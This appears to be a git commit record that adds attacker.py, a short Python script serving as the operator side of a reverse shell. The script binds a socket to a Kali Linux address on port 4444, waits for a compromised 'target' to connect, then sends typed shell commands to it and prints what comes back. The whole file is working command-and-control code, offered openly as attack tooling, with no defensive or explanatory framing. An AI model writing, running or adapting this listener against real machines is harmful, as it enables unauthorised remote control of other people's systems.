14977beaf94863e97cf7c7629e34d221b22f0edb
liberatoralistic <benhendrix2003@gmail.com>
2026-01-30 17:02:46 -0500

    Create attacker.py for listening and shell commands
    Implement a basic reverse shell server using sockets.

---
+++ attacker.py
@@ -0,0 +1,27 @@
+
+#!/usr/bin/python
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+s.bind(("10.0.0.67" , 4444))  # first parameter is your Kali Linux IP address
+s.listen(5)
+
+print("[+] Listening For Incoming Connections")
+
+target,ip = s.accept()
+print("[+] Target Connected!")
+
+
+while True:
+	command = input("* Shell#~%s: " % str(ip))
+	target.send(command.encode())
+	if command == "q":
+		break
+	result = target.recv(2048).decode()
+	print(result)
+
+target.close()
+s.close()
